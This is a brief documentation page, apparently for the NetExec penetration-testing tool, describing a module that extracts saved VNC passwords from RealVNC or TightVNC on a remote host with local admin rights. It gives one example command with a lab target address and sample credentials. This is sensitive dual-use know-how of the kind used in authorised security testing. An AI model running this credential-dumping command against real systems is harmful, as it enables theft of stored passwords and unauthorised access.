---
description: Dump VNC password from RealVNC or TightVNC
---

# 🆕 Dump VNC password from RealVNC or TightVNC

{% hint style="warning" %}
You need at least local admin privilege on the remote target, use option **--local-auth** if your user is a local account
{% endhint %}

RealVNC or TightVNC allow users to store credentials for connections. This module will automatically look for these credentials and extract them if found.

```bash
nxc smb 192.168.56.11 -u eddard.stark -p FightP3aceAndHonor! -M vnc
```
